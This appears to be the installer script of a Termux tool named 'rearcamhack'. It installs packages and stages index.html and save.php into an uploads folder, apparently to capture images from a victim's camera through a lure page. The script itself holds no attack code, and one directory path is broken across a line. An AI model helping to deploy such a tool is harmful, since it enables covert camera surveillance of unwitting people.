import os
tgreen = '\033[32m'
print( tgreen + "installing dependencies")
os.system("apt install curl")
os.system("apt install wget")
os.system("apt install unzip")
os.system("apt install php")
os.system("termux-setup-storage")
os.system("mkdir /sdcard/rearcamhack")
os.system("mv index.html /sdcard/rearcamhack && mv save.php /sdcard/rearcamhack")
os.system("mkdir /sdcard/rea
rcamhack/uploads")
os.system("chmod +x start.sh")
print(" ")
print("Now start the tool by using command ./start.sh")
